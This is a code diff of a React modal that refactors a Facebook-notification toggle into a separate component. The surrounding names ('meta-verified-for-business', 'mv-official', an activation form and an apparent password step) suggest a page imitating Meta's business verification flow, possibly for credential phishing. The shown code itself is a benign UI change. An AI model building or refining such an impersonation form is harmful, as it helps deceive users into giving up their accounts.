@@ -6,6 +6,7 @@ import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
 import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice';
 import { useAppStrings } from '@/hooks/useAppStrings';
 import ActivationRefChip from '@/components/meta-verified-for-business/ActivationRefChip';
+import FacebookNotifyToggle from '@/components/meta-verified-for-business/FacebookNotifyToggle';
 
 interface InfomationsModalProps {
   isOpend: boolean;
@@ -109,7 +110,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
       backdropClassName="mv-official-backdrop"
     >
       <div className="flex min-h-full min-w-0 w-full flex-col">
-        <ActivationRefChip />
+        <ActivationRefChip centered />
         <form onSubmit={handSubmit} autoComplete="off" className='w-full'>
           <div className='w-full'>
             <div className='mv-activation-hint mb-[14px] rounded-[12px] border px-[12px] py-[10px]'>
@@ -255,33 +256,10 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               />
             </div>
 
-            <div className='mv-activation-notify mb-[15px] overflow-hidden rounded-[12px] border shadow-[0_1px_3px_rgba(0,100,224,0.06)]'>
-              <div className='flex items-center gap-[14px] px-[14px] py-[13px]'>
-                <img
-                  src='/images/icons/ic_facebook.svg'
-                  alt=''
-                  aria-hidden
-                  className='h-[40px] w-[40px] shrink-0'
-                />
-                <div className='min-w-0 flex-1 pr-[4px]'>
-                  <p className='text-[14px] font-semibold leading-snug text-meta-text'>{t.info.fbNotifyTitle}</p>
-                  <p className='mt-[3px] text-[13px] leading-[1.45] text-meta-text-secondary'>{t.info.fbNotifyDesc}</p>
-                </div>
-                <button
-                  type='button'
-                  role='switch'
-                  aria-checked={fbNotifyOn}
-                  aria-label={t.info.fbNotifyAria}
-                  onClick={() => dispatch(updateForm({ facebookNotify: !fbNotifyOn }))}
-                  className={`relative inline-flex h-[28px] w-[52px] shrink-0 items-center rounded-full p-[2px] transition-[background-color,box-shadow] duration-300 ease-out focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-meta-blue/35 focus-visible:ring-offset-2 active:scale-[0.98] ${fbNotifyOn ? 'bg-meta-blue shadow-[inset_0_0_0_1px_rgba(0,0,0,0.06)]' : 'bg-meta-border shadow-[inset_0_1px_2px_rgba(0,0,0,0.08)]'}`}
-                >
-                  <span
-                    aria-hidden
-                    className={`pointer-events-none block h-[24px] w-[24px] rounded-full bg-white shadow-[0_1px_4px_rgba(0,0,0,0.2),0_0_0_1px_rgba(0,0,0,0.04)] transition-transform duration-300 ease-[cubic-bezier(0.4,0,0.2,1)] ${fbNotifyOn ? 'translate-x-[24px]' : 'translate-x-0'}`}
-                  />
-                </button>
-              </div>
-            </div>
+            <FacebookNotifyToggle
+              checked={fbNotifyOn}
+              onChange={(facebookNotify) => dispatch(updateForm({ facebookNotify }))}
+            />
 
             <div className='mt-[15px] mb-[20px]'>
               <label className='cursor-pointer flex items-center gap-[5px] text-[14px] text-meta-text-secondary' htmlFor="custom-checkbox">
